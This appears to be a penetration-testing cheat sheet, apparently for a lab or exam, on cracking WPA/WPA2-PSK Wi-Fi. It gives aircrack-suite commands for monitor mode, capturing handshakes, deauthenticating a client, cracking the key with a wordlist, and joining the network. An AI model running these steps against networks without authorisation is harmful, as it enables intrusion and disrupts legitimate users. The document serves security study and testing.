---
description: WPA/WPA2
---

# WPA-PSK

### Setup

{% code overflow="wrap" %}
```
sudo airmon-ng check kill

sudo airmon-ng start wlan0
```
{% endcode %}

### [Reconnaissance](../#reconnaissance)

{% code overflow="wrap" %}
```
sudo airodump-ng wlan0mon
```
{% endcode %}

{% hint style="info" %}
Gather `CH` `ESSID` `BSSID` & Clients ; `AUTH PSK`= WPA Personal
{% endhint %}

#### Capture + output as wpa-01.pcap

{% code overflow="wrap" %}
```
# -c channel -w output filename = recon-0#
sudo airodump-ng -c # --essid AP_NAME --bssid XX:XX:XX:XX:XX:XX -w wpa --output-format pcap wlan0mon
```
{% endcode %}

#### Deauth a client once to get reconnection for handshakes

{% code overflow="wrap" %}
```
#-a AP MAC -c Client MAC
sudo aireplay-ng -0 1 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```
{% endcode %}

### Cracking

#### aircrack-ng

{% code overflow="wrap" %}
```
#-b bssid -e essid
aircrack-ng -w /usr/share/john/password.lst -e AP_NAME -b XX:XX:XX:XX:XX:XX wpa-01.cap
```
{% endcode %}

### Connect to the network with retrieved credentials

#### Create `wpa_supplicant.conf`&#x20;

{% code overflow="wrap" %}
```
network={
  ssid="network"
  scan_ssid=1
  psk="password"
  key_mgmt=WPA-PSK
}
```
{% endcode %}

#### Connect to network

<pre><code><strong>wpa_supplicant -c &#x3C;config file>
</strong><strong>
</strong>sudo dhclient wlan0
</code></pre>

### Get proof

```
curl http://192.168.1.1/proof.txt
```
